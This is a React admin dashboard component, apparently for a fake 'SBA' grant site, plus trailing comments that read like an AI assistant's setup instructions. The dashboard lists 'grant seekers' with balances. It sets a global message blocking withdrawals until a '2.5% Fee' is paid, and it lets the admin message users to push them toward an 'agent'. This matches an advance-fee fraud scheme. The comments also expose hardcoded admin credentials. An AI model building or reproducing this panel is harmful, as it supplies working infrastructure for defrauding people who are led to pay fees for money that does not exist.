import React, { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../../utils/api'; // Import the API utility

const AdminDashboard = () => {
    const navigate = useNavigate();
    const [users, setUsers] = useState([]);
    const [loading, setLoading] = useState(false);
    const [withdrawalMsg, setWithdrawalMsg] = useState("withdrawal not possible right, 2.5% Fee not confirmed yet contact us or continue with your agent.");
    const [newWithdrawalMsg, setNewWithdrawalMsg] = useState(withdrawalMsg);
    const [notificationMessage, setNotificationMessage] = useState('');
    const [isSending, setIsSending] = useState(false);

    // Function to handle sign out (clears token and navigates)
    const handleSignOut = () => {
        localStorage.removeItem('token');
        localStorage.removeItem('user');
        navigate('/signin');
    };

    // -------------------------------------------------------------------------
    // CORE DATA FETCHING FUNCTION
    // -------------------------------------------------------------------------
    const fetchUsers = useCallback(async () => {
        setLoading(true);
        try {
            // Fetch All Users
            const usersRes = await api.get('/admin/users');
            // Filter out the admin user for the display list
            const filteredUsers = usersRes.data.filter(user => !user.isAdmin);
            setUsers(filteredUsers);
            
            // Fetch Configuration/Withdrawal Message
            const configRes = await api.get('/user/withdrawal-message');
            const message = configRes.data.message;
            setWithdrawalMsg(message);
            setNewWithdrawalMsg(message);

        } catch (error) {
            console.error("Admin data fetch failed:", error);
            // If authorization fails, log out
            if (error.response && error.response.status === 401) {
                 handleSignOut();
            }
        } finally {
            setLoading(false);
        }
    }, [navigate]);

    // Initial fetch on component mount
    useEffect(() => {
        fetchUsers();
    }, [fetchUsers]);


    // -------------------------------------------------------------------------
    // ADMIN ACTIONS
    // -------------------------------------------------------------------------

    const handleUpdateWithdrawalMessage = async (e) => {
        e.preventDefault();
        setLoading(true);
        try {
            const res = await api.post('/admin/withdrawal-message', { message: newWithdrawalMsg });
            setWithdrawalMsg(newWithdrawalMsg);
            alert(res.data.message);
        } catch (error) {
            alert("Failed to update message. Check console for details.");
            console.error("Update failed:", error);
        } finally {
            setLoading(false);
        }
    };

    const handleSendNotification = async (userId) => {
        if (!notificationMessage) {
            alert("Please enter a notification message.");
            return;
        }

        const user = users.find(u => u._id === userId);
        if (window.confirm(`Are you sure you want to send this message to ${user.firstName}?`)) {
            setIsSending(true);
            try {
                const res = await api.post('/admin/notify-user', { userId, message: notificationMessage });
                alert(res.data.message);
                setNotificationMessage(''); // Clear input
            } catch (error) {
                alert("Failed to send notification. Check console for details.");
                console.error("Notification failed:", error);
            } finally {
                setIsSending(false);
            }
        }
    };


    // -------------------------------------------------------------------------
    // RENDER
    // -------------------------------------------------------------------------

    const UserRow = ({ user }) => (
        <tr key={user._id}>
            <td className="p-3 whitespace-nowrap">{user.firstName} {user.lastName}</td>
            <td className="p-3 whitespace-nowrap">{user.email}</td>
            <td className="p-3 whitespace-nowrap font-bold text-green-600">
                {user.balance ? `$${user.balance.toLocaleString('en-US')}` : 'N/A'}
            </td>
            <td className="p-3">
                <input
                    type="text"
                    placeholder="Enter message..."
                    value={notificationMessage}
                    onChange={(e) => setNotificationMessage(e.target.value)}
                    className="p-1 border border-gray-300 rounded text-sm w-full"
                />
            </td>
            <td className="p-3">
                <button
                    onClick={() => handleSendNotification(user._id)}
                    disabled={isSending || !notificationMessage}
                    className="bg-red-600 hover:bg-red-700 text-white font-semibold py-1 px-3 rounded text-sm disabled:opacity-50 transition duration-150"
                >
                    {isSending ? 'Sending...' : 'Send Message'}
                </button>
            </td>
        </tr>
    );

    return (
        <div className="min-h-screen bg-gray-100 p-4 sm:p-8">
            <header className="flex justify-between items-center mb-8 pb-4 border-b border-gray-300">
                <div className="flex items-center space-x-2">
                    <img src="/sba_logo.png" alt="SBA Logo" className="h-8" />
                    <h1 className="text-xl font-bold text-gray-800">Admin Portal</h1>
                </div>
                <button 
                    onClick={handleSignOut}
                    className="bg-red-500 hover:bg-red-600 text-white font-semibold py-1 px-3 rounded-md shadow-md transition duration-150"
                >
                    Sign Out
                </button>
            </header>

            {/* Global Message Configuration Card */}
            <div className="bg-white p-6 rounded-xl shadow-lg mb-8">
                <h2 className="text-2xl font-semibold text-gray-700 mb-4">Global Withdrawal Message Config</h2>
                <form onSubmit={handleUpdateWithdrawalMessage} className="space-y-4">
                    <p className="text-sm text-gray-500 italic">This message is displayed to all authenticated users in their Withdrawal Section.</p>
                    <textarea
                        rows="3"
                        value={newWithdrawalMsg}
                        onChange={(e) => setNewWithdrawalMsg(e.target.value)}
                        className="w-full p-3 border-2 border-yellow-300 rounded-lg focus:ring-yellow-500 focus:border-yellow-500"
                        placeholder="Enter the global message for withdrawal attempts..."
                        required
                    />
                    <div className="text-right">
                        <button
                            type="submit"
                            disabled={loading || newWithdrawalMsg === withdrawalMsg}
                            className="bg-yellow-500 hover:bg-yellow-600 text-white font-bold py-2 px-6 rounded-lg shadow-md disabled:opacity-50 transition duration-150"
                        >
                            {loading ? 'Saving...' : 'Update Global Message'}
                        </button>
                    </div>
                </form>
                <p className="mt-4 text-xs text-gray-400">Current Message: "{withdrawalMsg}"</p>
            </div>

            {/* Users Section */}
            <div className="bg-white p-6 rounded-xl shadow-lg">
                <div className="flex justify-between items-center mb-4">
                    <h2 className="text-2xl font-semibold text-gray-700">Registered Grant Seekers ({users.length})</h2>
                    <button 
                        onClick={fetchUsers} 
                        disabled={loading}
                        className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg shadow-md disabled:opacity-50 transition duration-150"
                    >
                        {loading ? 'Refreshing...' : 'Refresh List'}
                    </button> 
                </div>

                {loading && users.length === 0 ? (
                    <p className="text-center py-10 text-lg text-gray-500">Loading user data...</p>
                ) : users.length === 0 ? (
                    <p className="text-center py-10 text-lg text-gray-500">No users registered yet.</p>
                ) : (
                    <div className="overflow-x-auto">
                        <table className="min-w-full divide-y divide-gray-200">
                            <thead className="bg-gray-50">
                                <tr>
                                    <th className="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Name</th>
                                    <th className="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Email</th>
                                    <th className="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Balance</th>
                                    <th className="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider w-1/3">Message to Send</th>
                                    <th className="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Action</th>
                                </tr>
                            </thead>
                            <tbody className="bg-white divide-y divide-gray-200">
                                {users.map(user => <UserRow key={user._id} user={user} />)}
                            </tbody>
                        </table>
                    </div>
                )}
            </div>
        </div>
    );
};

export default AdminDashboard;


//### **Action Plan Summary**

//1.  **Replace** the content of `client/src/components/admin/AdminDashboard.js` with the code above.
//2.  **Ensure** you completed the backend fixes (`server/config/seedAdmin.js` and the change in `server/server.js`).
//3.  **Restart both the backend and frontend.**

//Now, when you log in as the admin (`admin@gmail.com`, `admin100`), you should see the user you registered, and you can use the **Refresh List** button to update the data in real-time. Let me know if that works!